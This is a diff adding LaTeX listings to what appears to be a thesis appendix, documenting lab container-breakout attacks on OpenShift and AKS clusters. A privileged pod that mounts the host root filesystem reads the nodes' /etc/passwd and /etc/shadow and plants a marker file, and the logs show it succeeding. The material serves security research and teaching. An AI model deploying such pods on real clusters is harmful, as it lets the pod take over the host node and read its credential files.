@@ -204,6 +204,96 @@ connect@src/mongo/shell/mongo.js:344:17
 exception: connect failed
 #
 \end{lstlisting}
+
+\subsection{Container breakout attack conduction in the OCP cluster}
+
+\begin{lstlisting}[
+	caption={Shortened version of the shell I/O during the exploitation of the \gls{ocp} cluster attack by breakout},
+	label={lst:breakout-ocp-exploit},
+	breaklines=true]
+[root@openshiftmaster ~]# cat container_breakout.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+    name: breakout
+spec:
+    containers:
+    - name: breakout
+      securityContext:
+        privileged: true
+      image: alpine
+      command: ["/bin/sh"]
+      args: ["-c",
+                'echo -e "        /etc/passwd of underlying node";
+                cat /mnt/rootnode/etc/passwd;
+                echo -e "-----------\n        /etc/shadow of underlying node";
+                cat /mnt/rootnode/etc/shadow;
+                echo -e "-----------\n        root directory of underlying node";
+                ls -la /mnt/rootnode/;
+                touch /mnt/rootnode/ALL_YOUR_NODES_ARE_BELONG_TO_US;
+                echo -e "-----------\n        root directory of underlying node after manipulation through this container";
+                ls -la /mnt/rootnode/;
+                while true;
+                  do sleep 30;
+                done;'
+        ]
+      volumeMounts:
+      - name: root-volume
+        mountPath: /mnt/rootnode
+    volumes:
+    - name: root-volume
+      hostPath:
+        path: /
+[root@openshiftmaster ~]# oc apply -f container_breakout.yaml
+pod/breakout created
+[root@openshiftmaster ~]# oc logs breakout
+        /etc/passwd of underlying node
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+...
+gluster:x:997:994:GlusterFS daemons:/run/gluster:/sbin/nologin
+-----------
+        /etc/shadow of underlying node
+root:$6$Psl5jPOS<REDACTED>1::0:99999:7:::
+bin:*:17492:0:99999:7:::
+...
+gluster:!!:18036::::::
+-----------
+        root directory of underlying node
+total 32
+dr-xr-xr-x   17 root     root           236 Jun 13 14:34 .
+drwxr-xr-x    3 root     root            22 Jun 13 14:35 ..
+lrwxrwxrwx    1 root     root             7 May 16 14:59 bin -> usr/bin
+...
+drwxr-xr-x   20 root     root           282 May 20 08:00 var
+-----------
+        root directory of underlying node after manipulation through this container
+total 32
+dr-xr-xr-x   17 root     root           275 Jun 13 14:35 .
+drwxr-xr-x    3 root     root            22 Jun 13 14:35 ..
+-rw-r--r--    1 root     root             0 Jun 13 14:35 ALL_YOUR_NODES_ARE_BELONG_TO_US
+lrwxrwxrwx    1 root     root             7 May 16 14:59 bin -> usr/bin
+...
+drwxr-xr-x   20 root     root           282 May 20 08:00 var
+\end{lstlisting}
+
+\subsection{Container breakout node file system in the OCP cluster}
+
+\begin{lstlisting}[
+	caption={Shortened version of the shell I/O on the \gls{ocp} cluster worker node after the attack by breakout},
+	label={lst:breakout-ocp-nodeOutput},
+	breaklines=true]
+[root@openshiftworker ~]# ls -la /
+total 32
+dr-xr-xr-x.  17 root root  275 Jun 13 16:35 .
+dr-xr-xr-x.  17 root root  275 Jun 13 16:35 ..
+-rw-r--r--.   1 root root    0 Jun 13 16:35 ALL_YOUR_NODES_ARE_BELONG_TO_US
+lrwxrwxrwx.   1 root root    7 May 16 16:59 bin -> usr/bin
+...
+drwxr-xr-x.  20 root root  282 May 20 10:00 var
+\end{lstlisting}
+
+
 \subsection{Lateral movement attack preparation in the AKS cluster}
 \begin{lstlisting}[
 	caption={Shell I/O in preparation of the \gls{aks} cluster attack by lateral movement},
@@ -392,4 +482,96 @@ connect@src/mongo/shell/mongo.js:344:17
 @(connect):2:6
 exception: connect failed
 #
+\end{lstlisting}
+
+\subsection{Container breakout attack conduction in the AKS cluster}
+
+\begin{lstlisting}[
+	caption={Shortened version of the shell I/O during the exploitation of the \gls{aks} cluster attack by breakout},
+	label={lst:breakout-aks-exploit},
+	breaklines=true]
+lukas@Azure:~$ cat container_breakout.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+    name: breakout
+spec:
+    containers:
+    - name: breakout
+      securityContext:
+        privileged: true
+      image: alpine
+      command: ["/bin/sh"]
+      args: ["-c",
+                'echo -e "        /etc/passwd of underlying node";
+                cat /mnt/rootnode/etc/passwd;
+                echo -e "-----------\n        /etc/shadow of underlying node";
+                cat /mnt/rootnode/etc/shadow;
+                echo -e "-----------\n        root directory of underlying node";
+                ls -la /mnt/rootnode/;
+                touch /mnt/rootnode/ALL_YOUR_NODES_ARE_BELONG_TO_US;
+                echo -e "-----------\n        root directory of underlying node after manipulation through this container";
+                ls -la /mnt/rootnode/;
+                while true;
+                  do sleep 30;
+                done;'
+        ]
+      volumeMounts:
+      - name: root-volume
+        mountPath: /mnt/rootnode
+    volumes:
+    - name: root-volume
+      hostPath:
+        path: /
+lukas@Azure:~$ kubectl apply -f container_breakout.yaml
+pod/breakout created
+lukas@Azure:~$ kubectl logs breakout
+        /etc/passwd of underlying node
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+azureuser:x:1001:1001:Ubuntu:/home/azureuser:/bin/bash
+-----------
+        /etc/shadow of underlying node
+root:$6$w9SIk+c=<REDACTED>/:18039:0:99999:7:::
+daemon:*:18030:0:99999:7:::
+bin:*:18030:0:99999:7:::
+...
+azureuser:!:18064:7:90:7:30::
+-----------
+        root directory of underlying node
+total 100
+drwxr-xr-x   23 root     root          4096 Jun 17 12:59 .
+drwxr-xr-x    1 root     root          4096 Jun 17 13:02 ..
+-rw-------    1 root     root          1024 Jun 17 07:56 .rnd
+drwxr-xr-x    2 root     root          4096 May 23 18:48 bin
+...
+lrwxrwxrwx    1 root     root            30 May 15 03:24 vmlinuz.old -> boot/vmlinuz-4.15.0-1045-azure
+-----------
+        root directory of underlying node after manipulation through this container
+total 100
+drwxr-xr-x   23 root     root          4096 Jun 17 13:02 .
+drwxr-xr-x    1 root     root          4096 Jun 17 13:02 ..
+-rw-------    1 root     root          1024 Jun 17 07:56 .rnd
+-rw-r--r--    1 root     root             0 Jun 17 13:02 ALL_YOUR_NODES_ARE_BELONG_TO_US
+drwxr-xr-x    2 root     root          4096 May 23 18:48 bin
+...
+lrwxrwxrwx    1 root     root            30 May 15 03:24 vmlinuz.old -> boot/vmlinuz-4.15.0-1045-azure
+\end{lstlisting}
+
+\subsection{Container breakout node file system in the AKS cluster}
+
+\begin{lstlisting}[
+	caption={Shortened version of the shell I/O on the \gls{aks} cluster worker node after the attack by breakout},
+	label={lst:breakout-aks-nodeOutput},
+	breaklines=true]
+azureuser@aks-agentpool-35206649-1:~$ ls -la /
+total 100
+drwxr-xr-x  23 root root  4096 Jun 17 13:02 .
+drwxr-xr-x  23 root root  4096 Jun 17 13:02 ..
+-rw-r--r--   1 root root     0 Jun 17 13:02 ALL_YOUR_NODES_ARE_BELONG_TO_US
+drwxr-xr-x   2 root root  4096 May 23 18:48 bin
+...
+lrwxrwxrwx   1 root root    30 May 15 03:24 vmlinuz.old -> boot/vmlinuz-4.15.0-1045-azure
 \end{lstlisting}
